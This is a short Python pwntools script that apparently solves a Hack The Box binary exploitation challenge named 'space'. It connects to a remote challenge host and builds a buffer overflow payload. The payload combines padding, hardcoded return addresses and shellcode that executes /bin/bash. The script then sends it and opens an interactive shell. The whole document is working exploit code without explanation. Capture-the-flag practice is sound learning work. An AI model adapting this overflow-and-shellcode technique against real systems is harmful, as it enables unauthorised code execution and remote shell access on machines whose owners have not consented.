from pwn import *

HOST = "docker.hackthebox.eu"
PORT = 31823
p = remote(HOST, PORT)
#p = process("./space")

payload1 = 'A' * 14 + p32(0x0804b827) + p32(0x08049217) + p32(0x010101ff) + 'A' * 5
payload2 = 'A' * 18 + p32(0x0804b816) + asm(shellcraft.execve('/bin/bash'))
payload = payload1 + payload2

p.recvuntil("> ")
p.sendline(payload)
p.interactive()
